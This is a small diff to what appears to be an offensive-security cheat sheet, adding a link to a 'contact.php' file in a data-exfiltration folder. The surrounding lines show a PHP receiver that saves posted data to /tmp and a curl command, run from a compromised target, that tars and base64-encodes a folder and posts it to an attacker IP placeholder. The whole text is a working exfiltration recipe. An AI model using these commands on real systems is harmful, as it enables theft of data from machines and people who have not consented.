@@ -5,6 +5,7 @@
 # contact.php - see contact.php in DataExfiltation folder.
 <?php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>
 ```
+[contact.php](DataExfiltration/contact.php)
 ##### From target, use curl to send POST request that tars and encodes the data.
 ```bash
 curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<Attack IP Address>/contact.php
